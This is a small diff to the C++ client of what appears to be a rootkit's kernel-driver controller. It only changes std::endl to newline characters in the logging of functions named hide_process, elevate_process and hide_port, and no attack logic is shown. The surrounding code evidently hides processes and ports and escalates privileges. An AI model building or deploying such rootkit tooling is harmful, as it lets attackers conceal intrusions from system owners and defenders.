@@ -36,7 +36,7 @@ bool Driver::DriverHandler::check_connection(char* message)
 
 
 	if (status)
-		std::cout << "Message received from kerneland : " << ReadBuffer << std::endl;
+		std::cout << "Message received from kerneland : " << ReadBuffer << "\n";
 	else
 		logError("Connection Test Failed.");
 
@@ -59,7 +59,7 @@ bool Driver::DriverHandler::hide_process(char* message) {
 	);
 
 	if (status)
-		std::cout << "Process successfully hidden!" << std::endl;
+		std::cout << "Process successfully hidden!\n";
 	else
 		logError("couldn't hide process");
 
@@ -81,7 +81,7 @@ bool Driver::DriverHandler::elevate_process(char* message) {
 	);
 
 	if (status)
-		std::cout << "Process successfully elevated!" << std::endl;
+		std::cout << "Process successfully elevated!\n";
 	else
 		logError("couldn't elevate process");
 
@@ -103,7 +103,7 @@ bool Driver::DriverHandler::hide_port(char* message) {
 	);
 
 	if (status)
-		std::cout << "Port successfully Hidden!" << std::endl;
+		std::cout << "Port successfully Hidden!\n";
 	else
 		logError("couldn't hide port");
 
